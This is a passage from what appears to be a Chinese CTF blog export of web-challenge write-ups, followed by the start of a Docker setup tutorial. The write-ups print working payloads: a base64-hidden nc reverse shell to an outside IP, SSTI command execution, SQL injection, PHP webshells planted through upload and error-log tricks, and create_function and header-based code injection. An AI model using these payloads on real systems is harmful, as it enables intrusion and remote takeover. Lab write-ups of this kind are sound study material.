class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>二阶段payload如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">exec</span>=ok&amp;shell=`echo <span class="attribute">bmMgMTEwLjQxLjE3LjE4MyAyNTAgLWUgL2Jpbi9zaA</span>== | base64 -d`</span><br></pre></td></tr></table></figure><h2 id="WEEK2-MD5的事就拜托了">[WEEK2]MD5的事就拜托了</h2><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$$scheme</span>===<span class="string">&#x27;SHCTF&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;length&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>*<span class="number">100</span>!=<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>*<span class="number">100</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;&lt;/br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]!=<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;SHCTF&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>.<span class="title function_ invoke__">urldecode</span>(<span class="variable">$num</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;flag is&quot;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重点：哈希拓展长度攻击，工具hashpump，下面会举例说明</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Input</span> Signature:  <span class="keyword">key</span>和明文加密后得到的哈希值</span><br><span class="line"><span class="keyword">Input</span> Data:  给出的明文</span><br><span class="line"><span class="keyword">Input</span> <span class="keyword">Key</span> <span class="keyword">Length</span>:  <span class="keyword">key</span>的长度</span><br><span class="line"><span class="keyword">Input</span> Data to <span class="keyword">Add</span>:  想要添加的数值，这部分是必须得有的，就算没用</span><br><span class="line">最后得到的结果是结合更新后内容得到的哈希值</span><br><span class="line">后面是伪造的password</span><br></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里把flag的最后一个字符&#125;当成已知的字符进行伪造新的<span class="built_in">md5</span>值，把剩下的flag当作<span class="built_in">key</span></span><br></pre></td></tr></table></figure><p>一阶段：获得flag的md5和长度，开始就是一个url拆分套娃</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170602470.png" alt="image-20231015170602470"></p><p>二阶段：进行md5伪造</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231015170757186.png" alt="image-20231015170757186"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传参的时候去掉最前面的&#125;，因为真正的<span class="built_in">key</span>（flag），后面是自带一个&#125;的</span><br></pre></td></tr></table></figure><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?length<span class="operator">=</span><span class="variable">%80</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>P<span class="variable">%01</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span><span class="variable">%00</span>a</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">SHCTF<span class="operator">=</span>d<span class="number">285</span><span class="keyword">c</span><span class="number">0</span>becc<span class="number">667923569236</span>d<span class="number">9</span>eed<span class="number">60</span><span class="keyword">c</span><span class="number">79</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-ssti">[WEEK2]ez_ssti</h2><p>ssti</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">在hackerbar随手点了个exp就getshell了</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">?name=</span><span class="template-variable">&#123;&#123;<span class="name">g.pop.__globals__.__builtins__</span>[&#x27;__import__&#x27;](<span class="name">&#x27;os&#x27;</span>).popen(<span class="name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-EasyCMS">[WEEK2]EasyCMS</h2><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网上搜后台，<span class="literal">admin</span>/<span class="literal">admin</span>.php，密码是tao，进入后台发现可以编辑文件，直接写个马，蚁剑连接结束战斗</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStar CTF WEEK 2</title>
      <link href="/posts/1837dhw7.html"/>
      <url>/posts/1837dhw7.html</url>
      
        <content type="html"><![CDATA[<h1>NewStar CTF WEEK 2</h1><h2 id="游戏高手">游戏高手</h2><p>简单的JS小游戏</p><p><strong>如果你像我一样无聊，你可以尝试将飞机拉至最下方，静等flag</strong></p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013201850838.png" alt="image-20231013201850838"></p><p>找到了下面这段代码，大概就是玩够分数给你信息的意思</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202021581.png" alt="image-20231013202021581"></p><p>这里执行在控制台进行变量定义，然后直接去送，得到flag</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013202154600.png" alt="image-20231013202154600"></p><h2 id="include-0。0">include 0。0</h2><p>源代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// FLAG in the flag.php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/base|rot/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> nope</span><br></pre></td></tr></table></figure><p>考伪协议，过滤了base和rot，这里用其他编码进行绕过</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/convert.iconv.UCS-2LE.UCS-2BE/</span>resource=flag.php</span><br></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$stringa</span> = <span class="string">&quot;获得的加密字符&quot;</span>;</span><br><span class="line"><span class="variable">$stringb</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$stringa</span>, <span class="string">&#x27;UCS-2LE&#x27;</span>, <span class="string">&#x27;UCS-2BE&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stringb</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ez-sql">ez_sql</h2><p>sql注入，大写绕过，列数5列，直接看出来的</p><p>爆库名</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> Select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,dataabse() --+</span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unioN</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,Group_Concat(<span class="built_in">Table_nAme</span>) <span class="keyword">fRom</span> infoRmAtion_schemA.<span class="keyword">tAbles</span> <span class="keyword">whEre</span> tAble_schemA=<span class="string">&#x27;ctf&#x27;</span> #</span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,gRoup_coNcat(<span class="built_in">cOlumn_nAme</span>) <span class="keyword">fRom</span> infOrmAtion_schEma.<span class="keyword">cOlumns</span> <span class="keyword">whEre</span> <span class="built_in">tAble_Name</span>=<span class="string">&#x27;here_is_flag&#x27;</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>爆内容</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Union</span> sElect <span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">3</span>,gRoup_cOncat(flag) fRom here_is_flag --+</span><br></pre></td></tr></table></figure><h2 id="Unserialize？">Unserialize？</h2><p>实例化类自动触发destruct类，利用echo触发tostring方法，进行命令执行</p><p><strong>payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">&#x27;nl /th1s_1s_fffflllll4444aaaggggg&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Upload-again">Upload again!</h2><p>经过测试发现是对shell的内容进行了检查，感觉是检查了问号，文件后缀也做了过滤，php指定是传不上去了，这里使用.htaccess配置文件解析.jpg后缀进行绕过</p><p>.htaccess</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>chu0.jpg</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"> <span class="built_in">eval</span>($_POST[<span class="string">&#x27;chu0&#x27;</span>]); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20231013203719913.png" alt="image-20231013203719913"></p><h2 id="R-C-E">R!!C!!E!!</h2><p>首先是一个.git信息泄露，用GitHack-master获取.git的内容</p><p>源码如下：bo0g1pop.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经典的无参数rce，payload如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(array_pop(getallheaders()));   //getall...获取请求头信息，pop出最后一个进行eval</span><br></pre></td></tr></table></figure><p>请求头添加</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ZZZsd123</span><span class="operator">=</span>phpinfo()<span class="comment">;</span></span><br><span class="line">//这里注意，请求头的首字母一定靠后，这样才能保证他是请求头的最后一个，才能被eval正确的执行</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW红包题目</title>
      <link href="/posts/1824e02a.html"/>
      <url>/posts/1824e02a.html</url>
      
        <content type="html"><![CDATA[<h1 id="CTFSHOW红包题目"><a href="#CTFSHOW红包题目" class="headerlink" title="CTFSHOW红包题目"></a>CTFSHOW红包题目</h1><h3 id="红包7"><a href="#红包7" class="headerlink" title="红包7"></a>红包7</h3><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$name</span>,<span class="variable">$value</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(</span><br><span class="line">    <span class="string">&quot;ls &#x27;&quot;</span>.<span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]).<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;`&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;$&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是第一次见到了extract函数，百度之后知道了是一个赋值函数，主要用于变量覆盖方面</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20230813202700381.png" alt="image-20230813202700381"></p><p>大致意思就是</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">我们传入:</span><br><span class="line">?<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">结果为：</span><br><span class="line">$<span class="keyword">name</span>=<span class="keyword">value</span></span><br><span class="line">给<span class="keyword">name</span>进行了一波赋值</span><br></pre></td></tr></table></figure><p>ini_set()函数可以对php.ini进行配置，看了wp之后知道这题是需要更改报错日志路径进而写入恶意命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1：</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">1</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /f*&quot;</span>);<span class="meta">?&gt;</span></span><br><span class="line">这里还用到了一个技巧，系统命令可以使用%<span class="number">00</span>进行截断，进而触发报错，而报错会把所有的报错信息全部写入报错日志当中，而我们可以通过ini_set修改报错日志的储存路径，进而实现了恶意命令的写入。类似于包含日志。</span><br><span class="line">payload2：</span><br><span class="line">?name=error_log&amp;value=/<span class="keyword">var</span>/www/html/<span class="number">2</span>.php&amp;<span class="number">1</span>=%<span class="number">00</span><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo &#x27;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=&#x27; | base64 -d &gt; /var/www/html/chu1.php&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="红包8"><a href="#红包8" class="headerlink" title="红包8"></a>红包8</h2><p><strong>源代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-08-08 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-08-08 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="variable">$name</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$value</span>))();</span><br></pre></td></tr></table></figure><p>这道题目主要考察的是create_function()的做法，之前接触过两个相关题目，不过都是在第二个参数上做文章，多次测试之后发现由于base64编码的限制似乎无计可施，尝试所有该编码函数的漏洞，没查到。最后一招，摇人。得到了payload，后续网上搜得到了以下博客：<a href="https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail">https://blog.csdn.net/soldi_er/article/details/116244642?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22116244642%22%2C%22source%22%3A%22m0_74044466%22%7D&amp;fromshare=blogdetail</a></p><p>这里是在第一个参数上做文章，举例</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&quot;<span class="variable">$a</span>=123&quot;</span>,<span class="string">&quot;return 1;&quot;</span>)</span><br><span class="line"></span><br><span class="line">该函数处理之后将会得到以下匿名函数</span><br><span class="line"></span><br><span class="line">name1(<span class="variable">$a</span>=<span class="number">123</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">这里我们就可以在第一个参数的位置进行闭合</span><br><span class="line"><span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;phpinfo()<span class="comment">;/*</span></span><br><span class="line">这个时候就可以执行任意php代码啦</span><br><span class="line">?<span class="keyword">name</span>=<span class="variable">$name</span>=<span class="number">123</span>)&#123;&#125;<span class="params">system</span>(<span class="string">&quot;cat /f*&quot;</span>)<span class="comment">;/*&amp;value=1</span></span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 比赛WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于使用docker的一些感想，持续更新中...</title>
      <link href="/posts/7ea82466.html"/>
      <url>/posts/7ea82466.html</url>
      
        <content type="html"><![CDATA[<p>  docker教程其实很早就在酝酿了，但因为自己天赋不高，搞不明白，一直没有出，近期由于有出题需求，不得不又拾起vm里藏灰了的docker，又深入学习了一番，这里就不得不提到网上的各种博客，看了好长时间都看不懂，浪费了大把时间，由此被我授予了无良博客的头衔。这篇博客主要是介绍一下CTF中出题所需要的docker操作。持续更新中……</p><h2 id="docker配置教程"><a href="#docker配置教程" class="headerlink" title="docker配置教程"></a>docker配置教程</h2><h3 id="更换镜像源（阿里云）"><a href="#更换镜像源（阿里云）" class="headerlink" title="更换镜像源（阿里云）"></a>更换镜像源（阿里云）</h3><p><strong>选择性更换，如果再进行下面指令时没有报错，可以选择不更换</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/source<span class="selector-class">.list</span>   <span class="comment">//打开存源文件</span></span><br><span class="line"><span class="selector-tag">i</span>                               <span class="comment">//进入编辑模式</span></span><br><span class="line">将地址黏贴进去</span><br><span class="line">按ESC                           <span class="comment">//退出编辑模式</span></span><br><span class="line">输入:wq                         <span class="comment">//保存并退出</span></span><br></pre></td></tr></table></figure><p><strong>镜像源地址，全部复制进去</strong></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="line">deb-src https:<span class="comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br></pre></td></tr></table></figure><h3 id="创建docker"><a href="#创建docker" class="headerlink" title="创建docker"></a>创建docker</h3><p><strong>1.下载docker镜像</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt <span class="keyword">install</span> docker.io    </span><br></pre></td></tr></table></figure><p><strong>2.搜索\下载 服务器镜像</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker search pull   <span class="regexp">//</span>搜索服务器镜像，可以不搜</span><br><span class="line">docker pull 镜像名    <span class="regexp">//</span>例如docker pull tutum/lamp </span><br></pre></td></tr></table></figure><p><strong>3.创建docker</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 